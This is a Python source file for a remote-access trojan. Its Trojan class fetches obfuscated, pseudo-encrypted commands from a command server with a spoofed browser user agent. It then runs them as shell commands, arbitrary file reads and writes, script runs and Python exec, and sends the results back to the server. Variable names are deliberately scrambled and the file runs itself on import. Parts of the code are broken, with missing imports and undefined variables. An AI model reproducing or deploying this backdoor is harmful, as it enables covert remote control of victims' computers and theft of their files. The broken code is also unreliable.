import urllib.request as request
import urllib.parse as parse
from urllib.parse import quote, unquote

import json
import os
import sys
import random
import base64
import platform


def encrypt(plaintext: str) -> str:
    randomtext = ''
    for i in range(len(plaintext)):
        randomtext += plaintext[i]
        randomtext += chr(random.randint(33, 126))
    binarytext = ''.join(format(ord(i), '08b') for i in randomtext)
    binarytext = binarytext
    base64text = str(base64.b64encode(binarytext.encode('utf-8')))[2:-1] 
    randombase64text = ''
    for i in range(len(str(base64text))):
        randombase64text  += str(base64text)[i]
        randombase64text  += chr(random.randint(33, 126))
    html = ('<!doctype html><body>^%s^</body></doctype>' % randombase64text)
    return html


def decrypt(html : str) -> str:
    start = html.find('^') + 1
    end = -(html[::-1].find('^') +1)
    base64text = html[start:end]
    base64text_norandom = base64text[::2]
    binarytext = base64.b64decode(base64text_norandom.encode('latin-1'))
    randomtext = ''.join(chr(int(binarytext[i*8:i*8+8],2)) for i in range(len(binarytext)//8))
    plaintext = randomtext[::2]
    return plaintext


class Trojan:
    def __init__(self, commandurl,\
                useragent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
                computerid = 'None', **headers):
        self.commandurl = commandurl
        self.useragent = useragent
        self.computerid = computerid
        self.headers = {'computer-id':self.computerid, 'User-agent' : self.useragent}
        self.headers.update(headers)
    
    def commands(self) -> dict:
        print('[*] <- recieving commands')
        req = request.Request(self.commandurl, headers = self.headers)
        with request.urlopen(req) as response:
            encryptedresponse = response.read()
            encryptedresponse = encryptedresponse.decode()
        decryptedresponse = decrypt(encryptedresponse)
        commands = ''
        try:
            commands = json.loads(decryptedresponse)
        except json.JSONDecodeError:
            decryptedresponse = decryptedresponse.replace('\'', '"')
            commands = json.loads(decryptedresponse)
        return commands
    
    def sendoutcome(self, outcome: dict) -> str:
        print('[*] -> sending ', outcome)
        data = parse.quote(encrypt(str(outcome))).encode('utf-8')
        req = request.Request(self.commandurl, data=data, headers = self.headers)
        with request.urlopen(req) as response:
            response = response.read().decode()
        return response
            
    def run(self):
        JzH0oTSG = self.commands()
        outcomes = {'EI0ILNlH9QjMm' : [], 'yowwEp9pQIYv' : [], 't6Z5rKHgCpvn6' : [], 'NpP5lLMxSTy' : [], 'p_1io3vQuuA' : []}
        for _8Qz1Can, lGX5tRwLFtf4Q in JzH0oTSG.items():
            if _8Qz1Can.lower() == 'EI0ILNlH9QjMm': #cmd
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    output = str(os.popen(GLusu2aBblLHF).read())
                    if output == -1 or output == 1:
                        try:
                            output = subprocess.check_output(shlex.split(GLusu2aBblLHF), stderr=subprocess.STDOUT)
                        except Exception as e:
                            output = e
                    outcomes['EI0ILNlH9QjMm'].append([ GLusu2aBblLHF, output])
            elif _8Qz1Can.lower() == 'yowwEp9pQIYv': #file read
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    try:
                        with open(GLusu2aBblLHF, 'r') as file:
                            content = file.read()
                    except Exception as e:
                        content = e
                    outcomes['yowwEp9pQIYv'].append([GLusu2aBblLHF, content])
            elif _8Qz1Can.lower() == 't6Z5rKHgCpvn6': #file write
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    errors = None
                    try:
                        with open(GLusu2aBblLHF[0], 'w') as file:
                            file.write(value[1])
                    except Exception as e:
                        errors = e
                    outcomes['t6Z5rKHgCpvn6'].append([GLusu2aBblLHF[0], errors])
            elif _8Qz1Can.lower() == 'NpP5lLMxSTy':
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    filetype = value.split('.')[-1]
                    if filetype == '.py': filetype = 'python'
                    output = ''
                    if '.' not in filetype:
                        try:
                            output +=subprocess.check_output(shlex.split('%s %s' %(filetype, GLusu2aBblLHF)), stderr=subprocess.STDOUT).decode()
                        except Exception as e:
                            output += str(e)
                    else:
                        output += '\n\n[*] Invalid file type\n\n'
                    outcomes['NpP5lLMxSTy'].append([value, output])
            elif _8Qz1Can.lower() == 'p_1io3vQuuA':
                for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                    try:
                        if '()' not in value:
                            loc = {}
                            exec('output = %s' % GLusu2aBblLHF, globals(), loc)
                            output = loc['output']
                        else:
                            exec(GLusu2aBblLHF)
                            output = ('executed "%"s correctly' % value)
                    except Exception as e:
                        output = e
                    outcomes['p_1io3vQuuA'].append([GLusu2aBblLHF, output])
        outcomes = str(outcomes)
        self.sendoutcome(outcomes)
        
trojan = Trojan('http://127.0.0.1:8000', computerid=platform.node())
trojan.run()
